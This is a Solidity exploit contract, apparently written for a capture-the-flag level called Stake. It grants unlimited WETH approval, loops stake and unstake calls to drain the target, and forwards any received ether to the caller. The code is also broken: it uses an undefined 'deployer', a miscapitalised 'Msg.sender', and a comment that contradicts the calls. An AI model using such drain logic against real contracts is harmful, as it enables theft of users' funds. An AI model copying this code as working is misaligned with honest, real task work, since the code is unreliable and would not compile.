pragma solidity ^0.8.0;

import "../levels/Stake.sol";

interface IWETH {
    function approve(address to, uint256 amount) external returns (bool);
}


contract WETHExploit {
    Stake public stakeInstance;
    address public weth;
    
    constructor(address _stake) {
        require(Msg.sender == deployer);
        stakeInstance = Stake(_stake);
        weth = stakeInstance.WETH();
        IWETH(weth).approve(
            address(stakeInstance), 
            type(uint256).max
        );
    }
    
    function stakeAndUnstake() external payable {
        // First, stake via StakeWETH to drain ETH
        (bool success1,) = payable(stakeInstance).call{
            value: 0,
            gas: 50000
        }(abi.encodeWithSelector(
            stakeInstance.StakeWETH.selector, 
            1 ether
        ));
        require(success1, "StakeWETH call failed");

        // Then, unstake as much as possible
        uint256 balance = stakeInstance.UserStake(address(this));
        if (balance > 0) {
            (bool success2,) = payable(stakeInstance).call{
                value: 0,
                gas: 50000
            }(abi.encodeWithSelector(
                stakeInstance.Unstake.selector, 
                balance
            ));
            require(success2, "Unstake failed");

            // Recurse to unstake more if possible
            stakeAndUnstake();
        }
    }

    receive() external payable {
        (bool sent, ) = payable(Msg.sender).call{value: address(this).balance}("");
        if (!sent) revert();
    }
}

